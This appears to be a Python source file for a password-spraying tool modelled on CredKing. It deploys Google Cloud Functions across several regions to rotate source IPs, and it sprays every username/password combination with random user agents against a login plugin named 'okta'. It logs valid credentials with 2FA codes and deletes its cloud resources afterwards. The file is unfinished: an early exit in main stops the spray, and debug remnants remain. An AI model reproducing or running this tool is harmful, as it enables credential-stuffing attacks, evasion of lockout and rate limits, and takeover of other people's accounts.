#!/usr/bin/python3
import requests
import json
from googleapiclient.discovery import build
from google.oauth2 import service_account
from google.cloud import storage
from time import time
from concurrent.futures import ThreadPoolExecutor
from pprint import pprint
from threading import Lock, Thread
lock = Lock()
import json, sys, random, string, ntpath, time, os, datetime, queue, shutil
import re, argparse, importlib
_service_account_email = ""
credentials = {'accounts': []}

lock = Lock()
q = queue.Queue()

def main(args,pargs):
    global start_time, end_time, time_lapse

    thread_count = args.threads
    plugin = args.plugin
    username_file = args.userfile
    password_file = args.passwordfile
    sa_file = args.sa_creds_file
    useragent_file = args.useragentfile
    print(args.env)
    sys.exit(0)


    sys.exit(0)

    pluginargs = {}
    for i in range(0, len(pargs) - 1):
        key = pargs[i].replace("--", "")
        pluginargs[key] = pargs[i + 1]

    start_time = datetime.datetime.utcnow()
    log_entry('Execution started at: {}'.format(start_time))

    # Prepare credential combinations into the queue
    load_credentials(username_file, password_file, useragent_file)

    # Check with plugin to make sure it has the data that it needs
    validator = importlib.import_module('plugins.{}'.format(plugin))
    if getattr(validator, "validate", None) is not None:
        valid, errormsg = validator.validate(pluginargs)
        if not valid:
            log_entry(errormsg)
            return
    else:
        log_entry("No validate function found for plugin: {}".format(plugin))


    #sa_file = 'service-account.json'
    sa_credentials = service_account.Credentials.from_service_account_file(sa_file)
    _service_account_email = sa_credentials.service_account_email

    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
    storage_service = build('storage', 'v1', credentials=sa_credentials)

    # Uploading Code

    # Creating a bucket
    bucket_name = f"credking_{next(generate_random())}"
    body = {'name': bucket_name}
    log_entry(storage_service.buckets().insert(project=sa_credentials.project_id, predefinedAcl="projectPrivate",
                                               body=body).execute())

    # Uploading a file from a created bucket
    storage_client = storage.Client(project=sa_credentials.project_id, credentials=sa_credentials)
    bucket = storage_client.bucket(bucket_name)
    source_url = create_bucket(bucket,'okta')

    locations = service.projects().locations()
    functions = create_functions(sa_credentials,locations,sa_credentials.project_id,source_url,thread_count)

    for x in functions:
        check_function(locations.functions(),x)

    with ThreadPoolExecutor(max_workers=len(functions)) as executor:
        for function_name in functions:
            log_entry('Launching spray using {}...'.format(function_name))
            executor.submit(
                start_spray,
                sa_credentials=sa_credentials,
                function_name=function_name,
                args=pluginargs
            )

    for function_name in functions:
        delete_function(locations.functions(), function_name)
    delete_bucket(bucket)
    delete_zip()

def start_spray(sa_credentials,function_name,args):
    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
    function = service.projects().locations().functions()
    while True:
        item = q.get_nowait()

        if item is None:
            break

        payload = {}
        payload['username'] = item['username']
        payload['password'] = item['password']
        payload['useragent'] = item['useragent']
        payload['args'] = args
        body = {"data": json.dumps(payload)}

        invoke_function(function,function_name,body)

        q.task_done()

def load_credentials(user_file, password_file,useragent_file=None):
	log_entry('Loading credentials from {} and {}'.format(user_file, password_file))

	users = load_file(user_file)
	passwords = load_file(password_file)
	if useragent_file is not None:
		useragents = load_file(useragent_file)
	else:
		useragents = ["Python CredKing (https://github.com/ustayready/CredKing)"]

	for user in users:
		for password in passwords:
			cred = {}
			cred['username'] = user
			cred['password'] = password
			cred['useragent'] = random.choice(useragents)
			credentials['accounts'].append(cred)

	for cred in credentials['accounts']:
		q.put(cred)

def load_file(filename):
	if filename:
		return [line.strip() for line in open(filename, 'r')]

def create_functions(sa_credentials,locations,project_id,source_url,thread_count):
    # Get Locations
    locations_response = locations.list(name=f'projects/{project_id}').execute()
    location_names = ["us-central1","us-east1","us-east4","europe-west1","asia-east2"]
    #log_entry(len(locations_response['locations']))
    log_entry(len(location_names))
    # print(json.dumps(locations,indent=2))
    threads = thread_count

    if thread_count > len(location_names):
        threads = len(location_names)
    elif thread_count > len(credentials['accounts']):
        threads = len(credentials['accounts'])
    log_entry(f"Number of functions to be created: {threads}")
    function_names = []
    function = locations.functions()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for x in range(0,threads):
            function_names.append(
                executor.submit(
                    create_function,
                    sa_credentials=sa_credentials,
                    project_id=project_id,
                    source_url=source_url,
                    location=location_names[x]
                )
            )
    for x in function_names:
        print(x.result())
    return [x.result() for x in function_names]


def check_function(function, function_name):
    # Get Status of the function and make sure that it is active
    while True:
        sleep = 5
        status = function.get(name=function_name).execute()
        if status['status'] == 'ACTIVE':
            break
        else:
            log_entry(f"Waiting {sleep} seconds for function to become ACTIVE")
            time.sleep(sleep)
    log_entry(f"Created Function: {function_name}")


def log_entry(entry):
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
    print(f'[{ts}] {entry}')

def generate_random():
    seed = random.getrandbits(32)
    while True:
        yield seed
        seed += 1


def create_zip(plugin):
    plugin_path = 'plugins/{}/'.format(plugin)
    random_name = next(generate_random())
    build_zip = 'build/{}_{}.zip'.format(plugin, random_name)

    with lock:
        log_entry('Creating build deployment for plugin: {}'.format(plugin))
        shutil.make_archive(build_zip[0:-4], 'zip', plugin_path)

    return build_zip

def create_bucket(bucket,plugin):
    path = create_zip(plugin)
    blob = bucket.blob('test.zip')
    blob.upload_from_filename(path)
    object_url = f'gs://{blob.bucket.name}/{blob.name}'
    return object_url

def create_function(sa_credentials, project_id, source_url,location):
    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
    # Calling the create function command
    log_entry(location)
    f_name = f'credking-function-{next(generate_random())}'
    # function_name = f"{locations_response['locations'][x]['name']}/functions/{f_name}"
    location_name = f"projects/{project_id}/locations/{location}"
    function_name = f"{location_name}/functions/{f_name}"
    log_entry(function_name)
    log_entry(f"Creating Function: {function_name}")

    # Create Function
    body =  {
            "name" : function_name,
            "availableMemoryMb": 128,
            "entryPoint": "lambda_handler",
            "description": "CredKing Function",
            "timeout": "60s",
            "runtime": "python37",
            "ingressSettings": "ALLOW_ALL",
            "maxInstances": 1,
            "sourceArchiveUrl": source_url,
            "httpsTrigger": {},
            "vpcConnector": "",
            "serviceAccountEmail": _service_account_email
            }
    function = service.projects().locations().functions()
    function_resp = function.create(location=location_name,body=body).execute()
    log_entry(f"Function Resp: {function_resp}")

    return function_name

def invoke_function(function,function_name,payload):
    response = function.call(name=function_name, body=payload).execute()
    return_payload = json.loads(response['result'])

    user, password = return_payload['username'], return_payload['password']
    code_2fa = return_payload['code']
    if return_payload['success']:
        # TODO: Add this back in when iterating
        #clear_credentials(user, password)
        log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
    else:
        log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))

def delete_function(function,function_name):
    # Delete Function
    log_entry(function.delete(name=function_name).execute())

def delete_bucket(bucket):
    # Delete Code
    blob = bucket.blob('test.zip')
    blob.delete()
    bucket.delete()

def delete_zip():
    # Delete Zip
    file_list = [ f for f in os.listdir('build') if f.endswith(".zip") ]
    for f in file_list:
        os.remove(os.path.join('build', f))
        log_entry(f"Removing file {f}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    # Required Fields
    parser.add_argument('--plugin', help='spraying plugin', required=True)
    parser.add_argument('--threads', help='thread count (default: 1)',
                        type=int, default=1)
    parser.add_argument('--userfile', help='username file', required=True)
    parser.add_argument('--passwordfile', help='password file', required=True)
    parser.add_argument('--env', help="Serverless environments", required=True, action='append')

    # Optional Fields
    parser.add_argument('--useragentfile', help='useragent file', required=False)

    # AWS Environment Required Fields
    parser.add_argument('--access_key', help='aws access key', required=False)
    parser.add_argument('--secret_access_key', help='aws secret access key', required=False)

    # GCP Environment Required Fields
    parser.add_argument('--sa_creds_file', help="GCP Json Keys", required=False)

    args,plugin_args = parser.parse_known_args()
    main(args,plugin_args)
